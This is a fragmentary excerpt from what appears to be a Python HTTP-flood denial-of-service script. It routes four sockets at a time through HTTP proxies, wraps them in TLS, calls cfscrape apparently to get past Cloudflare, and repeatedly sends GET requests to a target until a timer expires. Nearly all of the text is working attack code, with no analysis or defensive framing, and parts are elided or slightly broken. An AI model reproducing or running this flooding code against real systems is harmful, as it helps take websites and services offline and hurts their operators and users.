    ...
    while time.time() < timer:
        try:
            ...
            if socks_type == 1:
                ...
                s2.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s3.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
                s4.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s2.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s3.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s4.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            s2.connect((str(target), int(port)))
            s3.connect((str(target), int(port)))
            s4.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
                s2 = ctx.wrap_socket(s2, server_hostname=target)
                s3 = ctx.wrap_socket(s3, server_hostname=target)
                s4 = ctx.wrap_socket(s4, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
                    s2.send(str.encode(request))
                    s3.send(str.encode(request))
                    s4.send(str.encode(request))
            except:
                s.close()
                s2.close()
                s3.close()
...
def http(event, socks_type):
    ...
    get_requets = get_host = "GET " + path + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    requests2 = get_requets + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            ...
            try:
                for _ in range(multiple):
                    ...
                    s3.send(str.encode(request))
                    s4.send(str.encode(request))
                    s.send(str.encode(requests2))
                    s2.send(str.encode(requests2))
                    s3.send(str.encode(requests2))
                    s4.send(str.encode(requests2))
            except:
                s.close()
                s2.close()
                s3.close()
    ...
    while time.time() < timer:
        try:
            ...
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
                s2 = ctx.wrap_socket(s, server_hostname=target)
                s3 = ctx.wrap_socket(s, server_hostname=target)
                s4 = ctx.wrap_socket(s, server_hostname=target)
            cfscrape.create_scraper(sess=s)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
                    s2.sendall(str.encode(request))
                    s3.sendall(str.encode(request))
                    s4.sendall(str.encode(request))
            except:
                s.close()
                s2.close()
                s3.close()
